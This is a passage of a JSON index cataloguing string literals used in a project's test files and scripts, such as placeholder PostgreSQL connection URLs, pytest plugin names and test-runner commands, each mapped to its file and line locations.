        "auth_service/tests/test_database_manager.py:38",
        "auth_service/tests/test_database_manager.py:80",
        "scripts/test_database_url_builder_comprehensive.py:147",
        "scripts/test_ssl_certificates_staging.py:172"
      ]
    },
    "postgresql://user:pass@/dbname?host=/cloudsql/project:region:instance": {
      "value": "postgresql://user:pass@/dbname?host=/cloudsql/project:region:instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:18"
      ]
    },
    "postgresql://user:pass@/dbname?host=/cloudsql/project:region:instance&sslmode=require": {
      "value": "postgresql://user:pass@/dbname?host=/cloudsql/project:region:instance&sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:19"
      ]
    },
    "postgresql://user:pass@34.132.142.103:5432/netra_staging?sslmode=require": {
      "value": "postgresql://user:pass@34.132.142.103:5432/netra_staging?sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:215"
      ]
    },
    "postgresql://user:pass@host/db?sslmode=require": {
      "value": "postgresql://user:pass@host/db?sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:234",
        "auth_service/tests/test_five_whys_reproduction.py:371"
      ]
    },
    "postgresql://user:pass@host:5432/db": {
      "value": "postgresql://user:pass@host:5432/db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:37",
        "auth_service/tests/test_postgres_compliance.py:54",
        "auth_service/tests/test_postgres_compliance.py:102"
      ]
    },
    "postgresql://user:pass@localhost/db": {
      "value": "postgresql://user:pass@localhost/db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:27",
        "auth_service/tests/test_database_manager.py:47",
        "auth_service/tests/test_database_manager.py:62",
        "auth_service/tests/test_database_manager.py:90",
        "auth_service/tests/test_database_manager.py:158"
      ]
    },
    "postgresql://user:pass@localhost/db?ssl=require": {
      "value": "postgresql://user:pass@localhost/db?ssl=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:55"
      ]
    },
    "postgresql://user:pass@localhost/db?sslmode=require": {
      "value": "postgresql://user:pass@localhost/db?sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_manager.py:72",
        "auth_service/tests/test_database_manager.py:119",
        "auth_service/tests/test_database_manager.py:132"
      ]
    },
    "postgresql://user:pass@localhost/dbname?host=/cloudsql/project:region:instance": {
      "value": "postgresql://user:pass@localhost/dbname?host=/cloudsql/project:region:instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:20"
      ]
    },
    "postgresql://user:pass@localhost:5432/db": {
      "value": "postgresql://user:pass@localhost:5432/db",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_database_connection.py:25",
        "auth_service/tests/test_critical_staging_issues.py:49",
        "auth_service/tests/test_critical_staging_issues.py:80",
        "scripts/test_auth_database_sessions.py:78",
        "scripts/test_auth_database_sessions.py:172",
        "scripts/test_auth_database_sessions.py:332"
      ]
    },
    "postgresql://user:pass@localhost:5432/db?ssl=require": {
      "value": "postgresql://user:pass@localhost:5432/db?ssl=require",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:155",
        "scripts/test_ssl_certificates_staging.py:171"
      ]
    },
    "postgresql://user:pass@localhost:5432/db?sslmode=require": {
      "value": "postgresql://user:pass@localhost:5432/db?sslmode=require",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:79",
        "scripts/test_database_url_builder_comprehensive.py:151",
        "scripts/test_ssl_certificates_staging.py:170"
      ]
    },
    "postgresql://user:pass@localhost:5432/dbname": {
      "value": "postgresql://user:pass@localhost:5432/dbname",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:76"
      ]
    },
    "postgresql://user:pass@localhost:5432/dbname?sslmode=require": {
      "value": "postgresql://user:pass@localhost:5432/dbname?sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:51"
      ]
    },
    "postgresql://user:pass@localhost:5432/test_db": {
      "value": "postgresql://user:pass@localhost:5432/test_db",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:196"
      ]
    },
    "postgresql://user:pass@staging-db:5432/db?sslmode=require": {
      "value": "postgresql://user:pass@staging-db:5432/db?sslmode=require",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:101"
      ]
    },
    "postgresql://user@": {
      "value": "postgresql://user@",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_database_manager_missing_method.py:330"
      ]
    },
    "postgresql://user_pr-4:password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "postgresql://user_pr-4:password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:265",
        "auth_service/tests/test_staging_database_credentials.py:358"
      ]
    },
    "postgresql://user_pr-4:some_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres": {
      "value": "postgresql://user_pr-4:some_password@/netra_staging?host=/cloudsql/netra-staging:us-central1:staging-shared-postgres",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:89"
      ]
    },
    "postgresql://user_pr-4:wrong_password@localhost:5432/netra_staging": {
      "value": "postgresql://user_pr-4:wrong_password@localhost:5432/netra_staging",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:325"
      ]
    },
    "postgres|PostgreSQL|psycopg": {
      "value": "postgres|PostgreSQL|psycopg",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:439"
      ]
    },
    "potentially failing test files": {
      "value": "potentially failing test files",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:268"
      ]
    },
    "pr_number": {
      "value": "pr_number",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:190"
      ]
    },
    "pre-deploy-1": {
      "value": "pre-deploy-1",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:113"
      ]
    },
    "pre_deployment_validation": {
      "value": "pre_deployment_validation",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:276",
        "auth_service/tests/test_five_whys_reproduction.py:305"
      ]
    },
    "pre_existing": {
      "value": "pre_existing",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:78",
        "scripts/test_error_monitor_logic.py:220",
        "scripts/test_error_monitor_logic.py:223"
      ]
    },
    "predictable patterns": {
      "value": "predictable patterns",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:104"
      ]
    },
    "prepare": {
      "value": "prepare",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:640"
      ]
    },
    "previous": {
      "value": "previous",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:69",
        "scripts/team_updates_test_analyzer.py:79",
        "scripts/team_updates_test_analyzer.py:85"
      ]
    },
    "primary_issues": {
      "value": "primary_issues",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:291",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:438",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:445"
      ]
    },
    "priority": {
      "value": "priority",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:16",
        "scripts/analyze_test_mocks.py:17",
        "scripts/analyze_test_mocks.py:18",
        "scripts/analyze_test_mocks.py:19",
        "scripts/analyze_test_mocks.py:20",
        "scripts/analyze_test_mocks.py:21",
        "scripts/analyze_test_mocks.py:22",
        "scripts/analyze_test_mocks.py:23",
        "scripts/analyze_test_mocks.py:24",
        "scripts/analyze_test_mocks.py:109"
      ]
    },
    "priority failures to process": {
      "value": "priority failures to process",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:365"
      ]
    },
    "priority_failure_count": {
      "value": "priority_failure_count",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:198",
        "scripts/test_failure_scanner.py:227"
      ]
    },
    "priority_failures": {
      "value": "priority_failures",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:356",
        "scripts/fix_test_batch.py:359",
        "scripts/test_failure_scanner.py:31",
        "scripts/test_failure_scanner.py:168",
        "scripts/test_failure_scanner.py:198",
        "scripts/test_failure_scanner.py:233",
        "scripts/test_failure_scanner.py:238"
      ]
    },
    "process": {
      "value": "process",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:90"
      ]
    },
    "process(es).": {
      "value": "process(es).",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:126"
      ]
    },
    "process_id": {
      "value": "process_id",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:244"
      ]
    },
    "processed": {
      "value": "processed",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:229",
        "scripts/fix_test_batch.py:246",
        "scripts/fix_test_batch.py:254",
        "scripts/fix_test_batch.py:255",
        "scripts/fix_test_batch.py:255",
        "scripts/fix_test_batch.py:381"
      ]
    },
    "prod": {
      "value": "prod",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:335",
        "scripts/unified_test_config.py:149",
        "scripts/unified_test_runner.py:606",
        "scripts/unified_test_runner.py:606",
        "scripts/unified_test_runner.py:617",
        "scripts/unified_test_runner.py:731",
        "scripts/unified_test_runner.py:738"
      ]
    },
    "production": {
      "value": "production",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:228",
        "auth_service/tests/test_cloud_sql_url.py:101",
        "auth_service/tests/test_database_manager.py:195",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:35",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:45",
        "scripts/test_database_url_builder_comprehensive.py:261"
      ]
    },
    "productivity_gain": {
      "value": "productivity_gain",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:212",
        "scripts/test_backend_optimized.py:212",
        "scripts/test_backend_optimized.py:232",
        "scripts/test_backend_optimized.py:232",
        "scripts/test_backend_optimized.py:270",
        "scripts/test_backend_optimized.py:330"
      ]
    },
    "profile": {
      "value": "profile",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_google.py:332",
        "auth_service/tests/integration/test_auth_oauth_google.py:333"
      ]
    },
    "progress_tracking": {
      "value": "progress_tracking",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:681"
      ]
    },
    "progression_rate": {
      "value": "progression_rate",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:25",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:32",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:39",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:46",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:161"
      ]
    },
    "project:region:instance": {
      "value": "project:region:instance",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_cloud_sql_url.py:44",
        "auth_service/tests/test_cloud_sql_url.py:45"
      ]
    },
    "projects/": {
      "value": "projects/",
      "category": "test_literals",
      "locations": [
        "scripts/test_auth_database_sessions.py:18",
        "scripts/test_ssl_certificates_staging.py:19",
        "scripts/test_staging_db_direct.py:21",
        "scripts/test_staging_migrations.py:18"
      ]
    },
    "prompt_tokens": {
      "value": "prompt_tokens",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:74",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:107",
        "netra_backend/app/services/realistic_test_data/llm_response_generator.py:115"
      ]
    },
    "proposed_files": {
      "value": "proposed_files",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:399"
      ]
    },
    "provider": {
      "value": "provider",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:402",
        "auth_service/tests/conftest.py:159",
        "auth_service/tests/factories/user_factory.py:85",
        "auth_service/tests/test_security.py:148",
        "auth_service/tests/test_security.py:160",
        "auth_service/tests/test_security.py:258",
        "auth_service/tests/test_security.py:293",
        "auth_service/tests/test_security.py:360",
        "auth_service/tests/test_security.py:410",
        "auth_service/tests/test_security.py:446"
      ]
    },
    "provider_data": {
      "value": "provider_data",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:84"
      ]
    },
    "provider_user_id": {
      "value": "provider_user_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/user_factory.py:82"
      ]
    },
    "psycopg": {
      "value": "psycopg",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:125",
        "scripts/test_ssl_certificates_staging.py:175"
      ]
    },
    "psycopg2": {
      "value": "psycopg2",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:125",
        "scripts/test_database_url_builder_comprehensive.py:169",
        "scripts/test_ssl_certificates_staging.py:175",
        "scripts/test_ssl_certificates_staging.py:245",
        "scripts/test_staging_migrations.py:70",
        "scripts/test_staging_migrations.py:74",
        "scripts/test_staging_migrations.py:200",
        "scripts/test_staging_migrations.py:206",
        "scripts/test_staging_migrations.py:237"
      ]
    },
    "psycopg2 URL valid:": {
      "value": "psycopg2 URL valid:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:75"
      ]
    },
    "push": {
      "value": "push",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:152"
      ]
    },
    "pyproject.toml": {
      "value": "pyproject.toml",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:89"
      ]
    },
    "pytest": {
      "value": "pytest",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:26",
        "auth_service/tests/test_auth_database_manager_missing_method.py:245",
        "auth_service/tests/test_auth_database_manager_missing_method.py:246",
        "auth_service/tests/test_database_manager.py:186",
        "scripts/analyze_test_overlap.py:218",
        "scripts/analyze_test_overlap.py:219",
        "scripts/auto_fix_test_violations.py:733",
        "scripts/autonomous_review/test_reviewer.py:113",
        "scripts/business_value_test_index.py:232",
        "scripts/business_value_test_index.py:244"
      ]
    },
    "pytest-asyncio": {
      "value": "pytest-asyncio",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:114",
        "scripts/test_backend.py:151"
      ]
    },
    "pytest-cov": {
      "value": "pytest-cov",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:115",
        "scripts/test_backend.py:152"
      ]
    },
    "pytest-mock": {
      "value": "pytest-mock",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:114",
        "scripts/test_backend.py:152"
      ]
    },
    "pytest-xdist": {
      "value": "pytest-xdist",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:115",
        "scripts/test_backend.py:153"
      ]
    },
    "pytest.ini": {
      "value": "pytest.ini",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:89",
        "scripts/test_backend.py:187",
        "scripts/test_backend.py:188",
        "scripts/unified_test_config.py:164",
        "scripts/unified_test_config.py:173",
        "scripts/unified_test_runner.py:83",
        "scripts/unified_test_runner.py:89"
      ]
    },
    "pytest.mark.": {
      "value": "pytest.mark.",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:234",
        "scripts/business_value_test_index.py:246"
      ]
    },
    "pytest.mark.asyncio": {
      "value": "pytest.mark.asyncio",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:533"
      ]
    },
    "pytest.mark.real_llm": {
      "value": "pytest.mark.real_llm",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:278"
      ]
    },
    "pytest_": {
      "value": "pytest_",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:133",
        "scripts/compliance/test_size_validator.py:261"
      ]
    },
    "pytest_asyncio": {
      "value": "pytest_asyncio",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:151"
      ]
    },
    "pytest_cov": {
      "value": "pytest_cov",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:152"
      ]
    },
    "pytest_mock": {
      "value": "pytest_mock",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:152"
      ]
    },
    "python": {
      "value": "python",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:524",
        "scripts/auto_fix_test_violations.py:733",
        "scripts/autonomous_review/test_reviewer.py:113",
        "scripts/cleanup_test_processes.py:79",
        "scripts/cleanup_test_processes.py:84",
        "scripts/startup_test_executor.py:68",
        "scripts/startup_test_executor.py:221",
        "scripts/test_frontend.py:279",
        "scripts/test_staging_migrations.py:146",
        "scripts/test_staging_migrations.py:246"
      ]
    },
    "python scripts/compliance/test_refactor_helper.py analyze app/tests/test_large.py": {
      "value": "python scripts/compliance/test_refactor_helper.py analyze app/tests/test_large.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:185"
      ]
    },
    "python scripts/compliance/test_refactor_helper.py suggest app/tests/test_large.py": {
      "value": "python scripts/compliance/test_refactor_helper.py suggest app/tests/test_large.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:186"
      ]
    },
    "python scripts/compliance/test_refactor_helper.py validate app/tests/test_large.py": {
      "value": "python scripts/compliance/test_refactor_helper.py validate app/tests/test_large.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:187"
      ]
    },
    "python scripts/compliance/test_size_validator.py": {
      "value": "python scripts/compliance/test_size_validator.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:179"
      ]
    },
    "python scripts/compliance/test_size_validator.py --format markdown": {
      "value": "python scripts/compliance/test_size_validator.py --format markdown",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:180"
      ]
    },
    "python scripts/compliance/test_size_validator.py --output report.md": {
      "value": "python scripts/compliance/test_size_validator.py --output report.md",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:181"
      ]
    },
    "python test_runner.py --level real_e2e": {
      "value": "python test_runner.py --level real_e2e",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:152"
      ]
    },
    "python test_runner.py --level real_e2e --real-llm": {
      "value": "python test_runner.py --level real_e2e --real-llm",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:84",
        "scripts/test_discovery_report.py:155"
      ]
    },
    "python test_runner.py --level real_e2e --real-llm --llm-model gemini-2.5-pro": {
      "value": "python test_runner.py --level real_e2e --real-llm --llm-model gemini-2.5-pro",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:158"
      ]
    },
    "python unified_test_runner.py --category frontend --real-services": {
      "value": "python unified_test_runner.py --category frontend --real-services",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:208"
      ]
    },
    "python unified_test_runner.py --category integration --real-services --real-llm": {
      "value": "python unified_test_runner.py --category integration --real-services --real-llm",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:210"
      ]
    },
    "python unified_test_runner.py --level integration": {
      "value": "python unified_test_runner.py --level integration",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:191"
      ]
    },
    "python unified_test_runner.py --skip-size-validation": {
      "value": "python unified_test_runner.py --skip-size-validation",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:129",
        "scripts/compliance/demo_test_size_enforcement.py:193"
      ]
    },
    "python unified_test_runner.py --strict-size": {
      "value": "python unified_test_runner.py --strict-size",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:128",
        "scripts/compliance/demo_test_size_enforcement.py:192"
      ]
    },
    "quality_gates": {
      "value": "quality_gates",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:430"
      ]
    },
    "quality_metrics": {
      "value": "quality_metrics",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:629",
        "scripts/business_value_test_index.py:746"
      ]
    },
    "quality_scores": {
      "value": "quality_scores",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:25",
        "scripts/real_service_test_metrics.py:68",
        "scripts/real_service_test_metrics.py:90",
        "scripts/real_service_test_metrics.py:91"
      ]
    },
    "quality_summary": {
      "value": "quality_summary",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:92",
        "scripts/real_service_test_metrics.py:180",
        "scripts/real_service_test_metrics.py:182"
      ]
    },
    "queue_depth": {
      "value": "queue_depth",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:159"
      ]
    },
    "quick": {
      "value": "quick",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:236"
      ]
    },
    "quick_test": {
      "value": "quick_test",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:404"
      ]
    },
    "quick_user": {
      "value": "quick_user",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:412"
      ]
    },
    "r": {
      "value": "r",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:25",
        "scripts/analyze_test_mocks.py:92",
        "scripts/analyze_test_overlap.py:105",
        "scripts/auto_fix_test_sizes.py:81",
        "scripts/auto_fix_test_sizes.py:607",
        "scripts/auto_fix_test_violations.py:114",
        "scripts/auto_fix_test_violations.py:200",
        "scripts/auto_fix_test_violations.py:343",
        "scripts/auto_fix_test_violations.py:575",
        "scripts/autonomous_review/test_reviewer.py:121"
      ]
    },
    "raceuser@example.com": {
      "value": "raceuser@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:914"
      ]
    },
    "random": {
      "value": "random",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:45"
      ]
    },
    "rate_limit": {
      "value": "rate_limit",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:38",
        "netra_backend/app/services/realistic_test_data/models.py:48",
        "netra_backend/app/services/realistic_test_data/models.py:58",
        "netra_backend/app/services/realistic_test_data/models.py:68",
        "netra_backend/app/services/realistic_test_data/models.py:78"
      ]
    },
    "rate_limit_exceeded": {
      "value": "rate_limit_exceeded",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:194"
      ]
    },
    "rate_limiting": {
      "value": "rate_limiting",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:111",
        "scripts/unified_test_config.py:108"
      ]
    },
    "read": {
      "value": "read",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:45",
        "auth_service/tests/test_auth_token_security.py:42",
        "auth_service/tests/test_auth_token_security.py:363",
        "auth_service/tests/unified/test_jwt_validation.py:45",
        "auth_service/tests/unified/test_jwt_validation.py:130",
        "auth_service/tests/unified/test_jwt_validation.py:331",
        "auth_service/tests/unit/test_oauth_models.py:116",
        "auth_service/tests/unit/test_oauth_models.py:123"
      ]
    },
    "readiness_separation": {
      "value": "readiness_separation",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:43"
      ]
    },
    "readiness_separation      → test_07_health_check_false_positives_during_init": {
      "value": "readiness_separation      → test_07_health_check_false_positives_during_init",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:393"
      ]
    },
    "ready": {
      "value": "ready",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:145"
      ]
    },
    "real": {
      "value": "real",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:158",
        "scripts/unified_test_runner.py:618"
      ]
    },
    "real e2e tests:": {
      "value": "real e2e tests:",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:74"
      ]
    },
    "real_": {
      "value": "real_",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:44"
      ]
    },
    "real_database": {
      "value": "real_database",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:92"
      ]
    },
    "real_e2e": {
      "value": "real_e2e",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:105"
      ]
    },
    "real_llm": {
      "value": "real_llm",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:87",
        "scripts/business_value_test_index.py:279",
        "scripts/business_value_test_index.py:280",
        "scripts/business_value_test_index.py:281",
        "scripts/business_value_test_index.py:463",
        "scripts/business_value_test_index.py:504",
        "scripts/unified_test_config.py:64",
        "scripts/unified_test_config.py:91",
        "scripts/unified_test_config.py:130",
        "scripts/unified_test_config.py:138"
      ]
    },
    "real_llm_coverage": {
      "value": "real_llm_coverage",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:630",
        "scripts/business_value_test_index.py:747"
      ]
    },
    "real_password": {
      "value": "real_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_auth_ssl_failures.py:159"
      ]
    },
    "real_services": {
      "value": "real_services",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:48",
        "scripts/add_test_markers.py:214",
        "scripts/test_discovery_report.py:105",
        "scripts/unified_test_config.py:90"
      ]
    },
    "real_websocket": {
      "value": "real_websocket",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:376"
      ]
    },
    "realistic_test_data_service": {
      "value": "realistic_test_data_service",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data_service.py:27"
      ]
    },
    "reason": {
      "value": "reason",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:59",
        "scripts/test_oauth_local.py:290",
        "scripts/test_oauth_local.py:374",
        "scripts/test_oauth_local.py:375",
        "scripts/test_oauth_local.py:417"
      ]
    },
    "recent-test-": {
      "value": "recent-test-",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_session_cleanup.py:189"
      ]
    },
    "recent_runs": {
      "value": "recent_runs",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:73"
      ]
    },
    "recommendation": {
      "value": "recommendation",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:30",
        "netra_backend/app/services/realistic_test_data/workload_simulator.py:187",
        "scripts/test_backend_optimized.py:344"
      ]
    },
    "recommendations": {
      "value": "recommendations",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:251",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:264",
        "scripts/analyze_test_overlap.py:361",
        "scripts/analyze_test_overlap.py:433",
        "scripts/analyze_test_overlap.py:538",
        "scripts/analyze_test_overlap.py:539",
        "scripts/analyze_test_overlap.py:661",
        "scripts/business_value_test_index.py:647",
        "scripts/business_value_test_index.py:763",
        "scripts/business_value_test_index.py:765"
      ]
    },
    "reconfigure": {
      "value": "reconfigure",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:343"
      ]
    },
    "reconnecting": {
      "value": "reconnecting",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:18"
      ]
    },
    "recovered": {
      "value": "recovered",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:156",
        "auth_service/tests/integration/test_redis_connection_failover.py:160"
      ]
    },
    "recovery:test": {
      "value": "recovery:test",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:146",
        "auth_service/tests/integration/test_redis_connection_failover.py:156",
        "auth_service/tests/integration/test_redis_connection_failover.py:159",
        "auth_service/tests/integration/test_redis_connection_failover.py:163"
      ]
    },
    "recovery_start": {
      "value": "recovery_start",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:89",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:115"
      ]
    },
    "recovery_time_minutes": {
      "value": "recovery_time_minutes",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:26",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:33",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:40",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:47",
        "netra_backend/app/services/realistic_test_data/performance_simulator.py:88"
      ]
    },
    "redirect": {
      "value": "redirect",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1108"
      ]
    },
    "redirectUri": {
      "value": "redirectUri",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:154"
      ]
    },
    "redirect_test_code_": {
      "value": "redirect_test_code_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1095"
      ]
    },
    "redirect_uri": {
      "value": "redirect_uri",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1097"
      ]
    },
    "redirect_uri=": {
      "value": "redirect_uri=",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:43"
      ]
    },
    "redirect_url": {
      "value": "redirect_url",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:203",
        "scripts/test_oauth_local.py:208"
      ]
    },
    "redis": {
      "value": "redis",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:908",
